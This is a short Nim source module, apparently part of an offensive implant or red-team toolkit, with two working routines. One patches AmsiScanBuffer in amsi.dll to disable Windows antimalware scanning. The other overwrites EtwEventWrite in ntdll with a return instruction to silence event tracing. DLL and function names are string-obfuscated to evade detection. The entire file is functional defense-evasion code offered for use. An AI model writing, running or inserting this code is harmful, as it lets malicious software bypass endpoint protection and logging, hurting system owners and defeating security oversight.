import winim/lean
import strenc

# Patch AMSI by overwriting AmsiScanBuffer at offset 0x1B
# Returns: 0=success, 1=error, 2=already patched
proc patchAMSI*(): int =
  try:
    let amsi = LoadLibraryA(obf("amsi.dll"))
    if amsi == 0:
      return 1
    
    let amsiScanBuffer = GetProcAddress(amsi, obf("AmsiScanBuffer"))
    if amsiScanBuffer == nil:
      return 1
    
    # Calculate patch address (offset 0x1B from AmsiScanBuffer)
    let patchAddr = cast[pointer](cast[int](amsiScanBuffer) + 0x1B)
    
    # Check if already patched
    let firstBytes = cast[ptr array[2, byte]](patchAddr)
    if firstBytes[][0] == 0x29 and firstBytes[][1] == 0xFF:
      return 2  # Already patched
    
    # Patch: sub ecx, edi (29 FF)
    var oldProtect: DWORD
    if VirtualProtect(patchAddr, 2, PAGE_EXECUTE_READWRITE, addr oldProtect) == 0:
      return 1
    
    let patch = cast[ptr array[2, byte]](patchAddr)
    patch[][0] = 0x29
    patch[][1] = 0xFF
    
    var temp: DWORD
    discard VirtualProtect(patchAddr, 2, oldProtect, addr temp)
    
    return 0  # Success
  except:
    return 1

# Patch ETW by overwriting EtwEventWrite
# Returns: 0=success, 1=error, 2=already patched
proc patchETW*(): int =
  try:
    let ntdll = LoadLibraryA(obf("ntdll.dll"))
    if ntdll == 0:
      return 1
    
    let etwEventWrite = GetProcAddress(ntdll, obf("EtwEventWrite"))
    if etwEventWrite == nil:
      return 1
    
    # Check if already patched
    let firstBytes = cast[ptr array[1, byte]](etwEventWrite)
    if firstBytes[][0] == 0xc3:
      return 2  # Already patched
    
    # Patch: ret (C3)
    var oldProtect: DWORD
    if VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, addr oldProtect) == 0:
      return 1
    
    let patch = cast[ptr byte](etwEventWrite)
    patch[] = 0xc3
    
    var temp: DWORD
    discard VirtualProtect(etwEventWrite, 1, oldProtect, addr temp)
    
    return 0  # Success
  except:
    return 1